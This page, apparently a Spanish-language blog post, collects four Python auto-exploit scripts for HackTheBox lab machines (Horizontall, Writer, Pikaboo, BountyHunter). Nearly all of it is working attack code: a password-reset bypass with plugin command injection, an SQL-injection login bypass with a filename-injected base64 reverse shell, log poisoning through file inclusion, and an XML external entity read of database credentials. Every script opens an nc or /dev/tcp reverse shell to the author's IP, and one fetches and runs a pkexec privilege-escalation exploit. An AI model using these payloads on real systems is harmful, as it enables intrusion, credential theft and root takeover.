---
layout: content
---
<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Horizontall - HackTheBox</h2>

Este *Script* explota un campo de reseteo de contraseña mal configurado para acceder como usuario admin y subir un *plugin* malicioso ganando un Shell inverso por `nc`, también se aprovecha del permiso `SUID` `pkexec` para escalar privilegios.

* Acceso como `root`
* Shell interactivo

```python
#!/usr/bin/python3
#coding: utf-8

from pwn import *
import sys
import requests
import signal
import subprocess
import urllib3
import json
import zipfile 
import shutil
import git

def def_handler(sig,frame):
	print("Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

class Exploit:

    def __init__(self, main_url, password, filename):
        self.url = main_url
	self.password = password
	self.filename = filename

    def zip_file(self):
	os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
	git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
	cwd = os.getcwd()
	shutil.make_archive(self.filename, 'zip', cwd+'/'+self.filename)

    def reset_password(self):
	s = requests.session()
	s.verify = False
	urllib3.disable_warnings()

	p1 = log.progress('Password')

	data_password = {
		'code': {'$gt':0},
		'password': self.password,
		'passwordConfirmation': self.password
	}

	r = s.post(self.url+'/admin/auth/reset-password', json=data_password).text

	response = json.loads(r)
	global jwt

	jwt = response['jwt']

	if 'jwt' not in r:
		p1.failure('Not changed password')
		sys.exit(1)
	else:
		p1.success(f'[Changed password] username admin and password {self.password}')

    def rce_starpi(self):

	header = { 'Authorization': f'Bearer {jwt}' }
		
	# Cambiar IP por la vuestra

	data_plugin = {
		'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.70 443 >/tmp/f)',
		'port': '1337'
	}

	r = requests.post(self.url+'/admin/plugins/install', json=data_plugin, headers=header)

	print(r.text)

autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')

def main():
	autopwn.zip_file()
	autopwn.reset_password()
	autopwn.rce_starpi()
	
	

if __name__ == '__main__':
	try:
		threading.Thread(target=main, args=()).start()
	except Exception as e:
		log.error(str(e))

shell = listen(443, timeout=20).wait_for_connection()
# Cambiar IP por la vuestra
shell.sendline('cd /tmp; wget http://10.10.16.70:8000/CVE-2021-4034.zip > /dev/null 2>&1; unzip -q CVE-2021-4034.zip; make 2>/dev/null; ./cve-2021-4034')
shell.interactive()
```

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Writer - HackTheBox</h2>

Este *Script* abusa de una mala sanitizacion en cuanto a código en `Flask` y permite ganar **ejecución remota de comandos** a través de la concatenación de código malicioso en el nombre de una imagen con extensión `.jpg`.

* Acceso como `www-data`
* Shell interactivo

```python
#!/usr/bin/python3

import signal
from pwn import *
import requests
import urllib3
import base64
import os

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales

login_url = "http://writer.htb/administrative"
add_post = "http://writer.htb/dashboard/stories/add"
bypass_sqli = "username: ' or 1 -- //"
#burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def main():
    # Cambiar IP por la vuestra
    payload_malicious = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.75/443 0>&1'"
    payload_malicious_bytes = payload_malicious.encode('ascii')
    base64_bytes = base64.b64encode(payload_malicious_bytes)
    base64_payload_malicious = base64_bytes.decode('ascii')

    os.system(f"""touch "reverse_shell.jpg; \`echo {base64_payload_malicious} | base64 -d | bash\`;" """)

    s = requests.session()
    s.verify = False
    urllib3.disable_warnings()

    p1 = log.progress("Login")

    data_post = {
        'uname': bypass_sqli,
        'password': bypass_sqli
    }

    r = s.post(login_url, data=data_post, allow_redirects=True)

    p1.status("Success [✔]")
    p2 = log.progress("Malicious image")

    image = open(f"reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;", "rb")

    file_image = {
        "author": (None, ''),
        "title": (None, ''),
        "tagline": (None, ''),
        "image": image,
        "image_url": (None, f'file:///var/www/writer.htb/writer/static/img/reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;'),
        "content": (None, '')
    }

    r = s.post(add_post, files=file_image)
    
    p2.success("Injected payload [✔]")
    
if __name__ == '__main__':

    try:
        threading.Thread(target=main, args=()).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Pikaboo - HackTheBox</h2>

Este *Script* se aprovecha de un `Local File Inclusion` para derivarlo al envenenado de logs de `FTP` y por ello ganar un Shell inverso inyectando código malicioso en los campos `user` y `password` en la autenticación.

* Acceso como `www-data`
* Shell interactivo

```python
#!/usr/bin/python3

from pwn import *
import requests
from ftplib import FTP
import ftplib

# Variables globales

main_url = "http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log"
# Cambiar IP por la vuestra
payload = """<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"'); ?>"""
lport = 443

def def_handler(sig,frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def main():
    p1 = log.progress("Payload")
    p1.status("Inyectando [*]")

    try:
        ftp = FTP("10.10.10.249")
        ftp.login(payload,payload)
    except ftplib.error_perm as error:
        p1.success("Inyectado [✔]")

    r = requests.get(main_url)

if __name__ == '__main__':

    try:
        threading.Thread(target=main, args=()).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">BountyHunter - HackTheBox</h2>

Este *Script* explota un `XML enternal entity` codificado en `base64` para poder visualizar `db.php`, este archivo contiene credenciales en texto plano, estas sirven para acceder por `SSH` haciendo uso del usuario `development`.

* Acceso como `development`
* Shell interactivo

```python
#!/usr/bin/python3
#coding: utf-8

from pwn import *
import requests
import base64
import re
from pexpect import pxssh
import html

# Variables globales
main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
#burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def main():
    username = "development"
    password = ""
    #Coficacion en base64
    xxe_payload = """<?xml  version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]> <bugreport> <title>&test;</title> <cwe>test</cwe> <cvss>test</cvss> <reward>test</reward> </bugreport>"""
    xxe_payload_bytes = xxe_payload.encode('ascii')
    base64_bytes = base64.b64encode(xxe_payload_bytes)
    base64_xxe_payload = base64_bytes.decode('ascii')

    data_post = {
        'data': base64_xxe_payload
    }

    r = requests.post(main_url, data=data_post)
    db_file = html.unescape(re.findall(r'<td>(.*?)</td>', r.text, re.DOTALL)[1]).strip()

    #Decodificacion de archivo db.php en base64
    base64_bytes = db_file.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')

    password = re.findall(r'dbpassword = "(.*?)";', message)[0]

    return password

def sshconnection(username, password):
    s = pxssh.pxssh()
    s.login('10.10.11.100', username, password)
    # Cambiar IP por la vuestra
    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f")
    s.prompt()
    s.logout()

if __name__ == '__main__':

    password = main()
    username = main()

    try:
        threading.Thread(target=sshconnection, args=('development', password)).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```
